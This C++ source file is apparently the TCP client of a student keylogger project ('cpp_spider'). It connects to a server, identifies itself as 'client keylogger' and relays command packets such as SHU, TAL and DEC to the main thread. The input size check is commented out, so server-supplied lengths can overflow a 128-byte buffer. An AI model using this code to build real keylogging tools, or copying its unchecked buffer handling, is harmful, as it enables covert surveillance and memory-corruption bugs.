//
// clientTcpSocket.cpp for  in /home/gandoulf/epitech/cpp_spider/source/socket
//
// Made by Gandoulf
// Login   <gandoulf@epitech.net>
//
// Started on  Wed Nov  9 15:32:04 2016 Gandoulf
// Last update Mon Nov 14 18:06:35 2016 Gandoulf
//

#include <cstdlib>
#include <iostream>
#include <string>

#include "socket/socketC/clientTcpSocketC.hpp"
#include "spider/packetUnserializer.hpp"

namespace spider
{
  namespace socket
  {
    ClientTcpSocket::ClientTcpSocket(std::string adresse, int port)
      : _runningService(false), _adresse(adresse), _port(port), _clientID(0), _firstRead(true)
    {
      memset(&_data[0], 0, 128);
      _client.OnReadPossible([this](Socket::Client &client, size_t length)
			     {
			       std::cout << "length = " << length << std::endl;
			       if (/*_firstRead &&*/ length == 21)
				 {
				   _firstRead = false;
				   memset(&_data[0], 0, 128);
				   _client.read(static_cast<void *>(_data), 21);
				   std::cout << _data << std::endl;
				 }
			       //else if (!_firstRead)
			       else if (length >= sizeof(PackageHeader))
				 readHeader();
			     });
      _client.OnWritePossible([this](Socket::Client &client)
			      {
				doWrite();
			      });
      _client.OnStart([this](Socket::Client &client, std::string const &address, int port)
		      {
			std::cout << "connection" << std::endl;
		      });
      _client.OnDisconnect([this](Socket::Client &client)
			   {
			     std::cout << "disonnection" << std::endl;
			     _Mqueue.lock();
			     for (auto ite = _messages.begin(); ite != _messages.end(); ++ite)
			       delete[] *ite;
			     _messages.clear();
			     _messagesSize.clear();
			     _Mqueue.unlock();
			   });
#ifdef _WIN32
	  mainThreadId = GetCurrentThreadId();
#endif
    }

	ClientTcpSocket::~ClientTcpSocket()
	{
		char *tmp;
		while (tmp = _rdQ.front())
		{
			delete[] tmp;
			_rdQ.pop();
		}

		for (auto it = _messages.begin(); it != _messages.end(); ++it)
		{
			delete[] * it;
		}
	}

    void ClientTcpSocket::close()
    {
      if (_runningService)
	{
	  _runningService = false;
	  std::cout << "close client" << std::endl;
	  _client.stop();
	}
      else
	std::cout << "client already close" << std::endl;
    }

    void ClientTcpSocket::connect()
    {
      if (!_runningService)
	{
	  _firstRead = true;
	  char *msg = new char[18];
	  std::memcpy(msg, "client keylogger\n", 17);
	  _messages.push_back(msg);
	  _messagesSize.push_back(17);
	  _runningService = true;
	  std::cout << "starting client" << std::endl;
	  _client.start(_adresse, _port);
	}
      else
	std::cout << "service already started" << std ::endl;
    }

    bool ClientTcpSocket::startedService() const
    {
      return _runningService;
    }

    void ClientTcpSocket::startService()
    {
      connect();
    }

    void ClientTcpSocket::closeService()
    {
      close();
    }

    void ClientTcpSocket::setClientID(int id)
    {
      _clientID = id;
    }

    void ClientTcpSocket::setServer(std::string adresse, int port)
    {
      _adresse = adresse;
      _port = port;
    }

    void ClientTcpSocket::readHeader()
    {
      memset(&_data[0], 0, 128);
      _client.read(static_cast<void *>(_data), sizeof(PackageHeader));
      _packet.setHeader(_data, sizeof(PackageHeader));
      /*if(_packet.getHeader().magicNumber != SEND ||
	 _packet.getHeader().magicNumber != REC ||
	 _packet.getHeader().size > 1000)
	 _client.disconnect();*/
      readData();
    }

    void ClientTcpSocket::readData()
    {
      memset(&_data[0], 0, 128);
      _client.read(static_cast<void *>(_data), _packet.getHeader().size -
		   sizeof(PackageHeader));
      _packet.setData(_data, _packet.getHeader().size - sizeof(PackageHeader));
      _packet.printPacketType();
      char *msg;
      msg = new char[_packet.getHeader().size];
      std::memcpy(msg, _packet.getHeaderC(), sizeof(PackageHeader));
      std::memcpy(msg + sizeof(PackageHeader), _packet.getDataC(), _packet.getHeader().size -
		  sizeof(PackageHeader));

	  PacketUnserializer *unz = new PacketUnserializer();
	  unz->setHeader(msg, sizeof(PackageHeader));
	  unz->setData(msg + sizeof(PackageHeader), unz->getHeader().size - sizeof(PackageHeader));

#ifdef _WIN32
	  if (!strncmp(unz->getPacketType(), "SHU", 3))
	  {
		  PostThreadMessage(mainThreadId, WM_NULL, 0, (LPARAM)new std::string("SHU"));
	  }
	  else if (!strncmp(unz->getPacketType(), "TAL", 3))
	  {
		  PostThreadMessage(mainThreadId, WM_NULL, 0, (LPARAM)new std::string("TAL"));
	  }
	  else if (!strncmp(unz->getPacketType(), "DEC", 3))
	  {
		  PostThreadMessage(mainThreadId, WM_NULL, 0, (LPARAM)new std::string("DEC"));
	  }
	  else
		  return;

	  //Test test = unz->getData<Test>();

	  //if (!PostThreadMessage(mainThreadId, WM_NULL, 0, (LPARAM)test.str))
		 // std::cout << "POST MESSAGE FAILED" << std::endl;
	  SLEEPMS(1);
#endif
    }

    void ClientTcpSocket::doWrite()
    {
      _Mqueue.lock();
      if (!_messages.empty())
	{
	  for (int i = 0; i < _messagesSize.front(); ++i) {
	    std::cout << std::hex << (int)(_messages.front()[i]);
	  }
	  std::cout << std::dec << std::endl;
	  _client.write(_messages.front(), _messagesSize.front());
	  delete[] _messages.front();
	  _messages.pop_front();
	  _messagesSize.pop_front();
	}
      _Mqueue.unlock();
    }

	std::mutex *ClientTcpSocket::getQMtx()
	{
		return &_mtxQ;
	}

	std::queue<char *>& ClientTcpSocket::getRdQ()
	{
		return _rdQ;
	}
  }
}
